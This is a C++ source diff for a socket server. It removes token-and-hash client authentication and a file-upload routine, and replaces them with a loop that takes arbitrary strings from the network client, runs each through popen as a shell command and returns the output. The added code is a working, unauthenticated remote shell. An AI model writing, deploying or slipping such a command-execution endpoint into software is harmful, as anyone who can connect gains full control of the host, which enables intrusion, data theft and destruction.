@@ -85,47 +85,30 @@ private:
     }
 
     void handle_client() {
-        flush_socket_buffer(client_socket);
-
-        string token = generate_random_string(TOKEN_LENGTH);
-        cout << "Token: " << token << '\n';
-
-        if (send(client_socket, token.c_str(), token.size() + 1, 0) == -1) { // include null terminator
-            perror("[ERROR] : Sending token to client failed");
-            close(client_socket);
-            return;
-        }
-        cout << "[LOG] : Token sent to client. Waiting for hash...\n";
-
-        flush_socket_buffer(client_socket);
-
-        string expected_hash = to_string(fnv1a_hash(token));
-        char received_hash[1024] = {0};
-        if (recv(client_socket, received_hash, sizeof(received_hash), 0) == -1) {
-            perror("[ERROR] : Receiving hash from client failed");
-            close(client_socket);
-            return;
-        }
-        cout << "[LOG] : Hash received from client. Checking hash...\n";
-
-        if (authenticate_client(string(received_hash), expected_hash)) {
-            cout << "[LOG] : Hash verified!\n";
-            send_message("Authentication successful\n");
-
-            string folder_name = create_timestamped_folder();
-            if (!folder_name.empty()) {
-                cout << "[LOG] : Folder created successfully.\n";
-                send_message("start");
-
-                receive_files(folder_name);
-            } else {
-                cout << "[ERROR] : Folder creation failed.\n";
+        while (true) {
+            string command = recive_message();
+            if (command == "exit") {
+                break;
             }
-        } else {
-            cout << "[LOG] : Hash verification failed!\n";
+            execute_command(command);
         }
 
-        close(client_socket);
+    }
+
+    void execute_command(const string& command) {
+        flush_socket_buffer(client_socket);
+        char buffer[1024];
+        string output;
+        FILE* pipe = popen(command.c_str(), "r");
+        if (!pipe) {
+            perror("[ERROR] : Failed to execute shell command");
+            return;
+        }
+        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            output += buffer;
+        }
+        pclose(pipe);
+        send_message(output);
     }
 
     void flush_socket_buffer(int socket) {
@@ -146,147 +129,14 @@ private:
         }
     }
 
-    string generate_random_string(size_t length) {
-        const string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/~`";
-        random_device rd;
-        mt19937 generator(rd());
-        uniform_int_distribution<> distribution(0, characters.size() - 1);
-
-        string random_string;
-        for (size_t i = 0; i < length; ++i) {
-            random_string += characters[distribution(generator)];
+    string recive_message() {
+        char buffer[1024] = {0};
+        if (recv(client_socket, buffer, sizeof(buffer), 0) == -1) {
+            perror("[ERROR] : Receiving message from client failed");
         }
-        return random_string;
+        return buffer;
     }
 
-    size_t fnv1a_hash(const string& str) {
-        const size_t FNV_offset_basis = 14695981039346656037ULL;
-        const size_t FNV_prime = 1099511628211ULL;
-
-        size_t hash = FNV_offset_basis;
-        for (char c : str) {
-            hash ^= static_cast<size_t>(c);
-            hash *= FNV_prime;
-        }
-        return hash;
-    }
-
-    bool authenticate_client(const string& received_hash, const string& expected_hash) {
-        return received_hash == expected_hash;
-    }
-
-    bool create_folder(const string& folder_name) {
-        cout << "[DEBUG] : Trying to create folder: " << folder_name << endl;
-        if (folder_name == ".") {
-            cout << "[DEBUG] : Skipping creation of current directory.\n";
-            return true;
-        }
-        size_t pos = folder_name.find_last_of('/');
-        if (pos!= string::npos) {
-            string parent_folder = folder_name.substr(0, pos);
-            if (!create_folder(parent_folder)) {
-                return false;
-            }
-        }
-        if (mkdir(folder_name.c_str(), 0755) == -1) {
-            if (errno == EEXIST) { // Folder already exists, skip error
-                cout << "[DEBUG] : Folder already exists: " << folder_name << endl;
-                return true;
-            } else {
-                perror("[ERROR] : Creating folder failed");
-                cout << "[DEBUG] : Error creating folder: " << strerror(errno) << endl;
-                return false;
-            }
-        }
-        cout << "[DEBUG] : Folder created successfully: " << folder_name << endl;
-        return true;
-    }
-
-    string create_timestamped_folder() {
-        time_t now = time(0);
-        tm *ltm = localtime(&now);
-        string folder_name = to_string(1900 + ltm->tm_year) + "-" +
-                             to_string(1 + ltm->tm_mon) + "-" +
-                             to_string(ltm->tm_mday) + "_" +
-                             to_string(ltm->tm_hour) + "-" +
-                             to_string(ltm->tm_min) + "-" +
-                             to_string(ltm->tm_sec);
-        return create_folder(folder_name) ? folder_name : "";
-    }
-
-    void receive_files(const string& folder_name) {
-        string full_folder_path = "./" + folder_name;
-        mkdir(full_folder_path.c_str(), 0755); // Create the folder here
-
-        string current_folder = full_folder_path; // Use the full folder path as the current folder
-
-        while (true) {
-            flush_socket_buffer(client_socket);
-
-            char filename[1024] = {0};
-            if (recv(client_socket, filename, sizeof(filename), 0) == -1) {
-                perror("[ERROR] : Receiving filename from client failed");
-                return;
-            }
-
-            // Check if filename is empty
-            if (strlen(filename) == 0) {
-                cerr << "[ERROR] : Received empty filename, skipping.\n";
-                continue;
-            }
-
-            if (strcmp(filename, "end_of_files") == 0) {
-                break;
-            }
-
-            if (strncmp(filename, "DIR:", 4) == 0) {
-                string dir_path = filename + 4; // Skip "DIR:"
-                dir_path = current_folder + "/" + dir_path;
-                if (!create_folder(dir_path)) {
-                    perror("[ERROR] : Creating directory failed");
-                    return;
-                }
-                cout << "[LOG] : Directory created: " << dir_path << endl;
-            } else {
-                cout << "[LOG] : Receiving file: " << filename << endl;
-
-                ssize_t filesize;
-                if (recv(client_socket, &filesize, sizeof(filesize), 0) == -1) {
-                    perror("[ERROR] : Receiving file size from client failed");
-                    return;
-                }
-                cout << "[LOG] : File size: " << filesize << " bytes\n";
-
-                if (filesize <= 0) {
-                    perror("[ERROR] : Invalid file size received");
-                    return;
-                }
-
-                string filepath = current_folder + "/" + string(filename);
-                ofstream file(filepath, ios::binary);
-                if (!file) {
-                    perror("[ERROR] : Opening file for writing failed");
-                    return;
-                }
-
-                char buffer[1024];
-                size_t bytes_received = 0;
-                while (bytes_received < filesize) {
-                    ssize_t n = recv(client_socket, buffer, min(sizeof(buffer), filesize - bytes_received), 0);
-                    if (n == -1) {
-                        perror("[ERROR] : Receiving file data from client failed");
-                        return;
-                    }
-                    file.write(buffer, n);
-                    bytes_received += n;
-                }
-
-                cout << "[LOG] : File received and saved to " << filepath << endl;
-                send_message("File received: " + string(filename));
-            }
-        }
-        cout << "[LOG] : All files received.\n";
-    }
     void send_message(const string& message) {
         if (send(client_socket, message.c_str(), message.size() + 1, 0) == -1) { // include null terminator
             perror("[ERROR] : Sending message to client failed");
